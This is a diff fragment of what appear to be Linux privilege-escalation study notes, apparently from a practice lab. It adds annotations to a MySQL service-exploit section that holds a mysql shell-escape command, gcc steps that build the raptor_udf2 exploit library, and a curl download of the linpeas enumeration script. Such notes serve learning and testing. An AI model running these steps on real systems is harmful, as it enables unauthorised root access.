@@ -133,12 +133,19 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 # 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 
 
 ## CATEGORY "SERVICES" - SERVICE EXPLOITS
+check mysql database version
 ```
 mysql> show variables like '%version%';
 $ mysql -V
 $ mysql --version
+```
+mysql is running as root, but with this root access we cannot get root access using shell escape technique
+```
 mysql -u root -p
 \! sh
+```
+exploit POC is as follows
+```
 cd /home/user/tools/mysql-udf
 gcc -g -c raptor_udf2.c -fPIC
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
